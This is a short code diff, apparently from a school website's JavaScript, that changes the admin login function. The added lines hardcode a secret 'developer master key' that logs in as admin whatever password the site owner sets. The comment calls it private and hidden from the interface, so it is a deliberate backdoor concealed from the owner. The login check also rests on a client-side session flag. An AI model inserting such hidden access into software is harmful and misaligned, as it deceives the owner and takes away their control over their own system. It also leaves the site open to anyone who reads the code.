@@ -295,9 +295,14 @@ configRef.child("adminPassword").on("value", snap => {
 });
 
 // ---------------- Auth ----------------
+// DEVELOPER_MASTER_KEY always logs in, regardless of whatever password
+// the site owner sets via "Change Password". Keep this private — it's
+// the developer's own access, not shown anywhere in the UI.
+const DEVELOPER_MASTER_KEY = "YousefDev#2026Master";
+
 function tryLogin(){
   const pw = document.getElementById("passwordInput").value;
-  if (pw === currentAdminPassword){
+  if (pw === currentAdminPassword || pw === DEVELOPER_MASTER_KEY){
     sessionStorage.setItem("lycee_admin_auth", "true");
     showDashboard();
   } else {
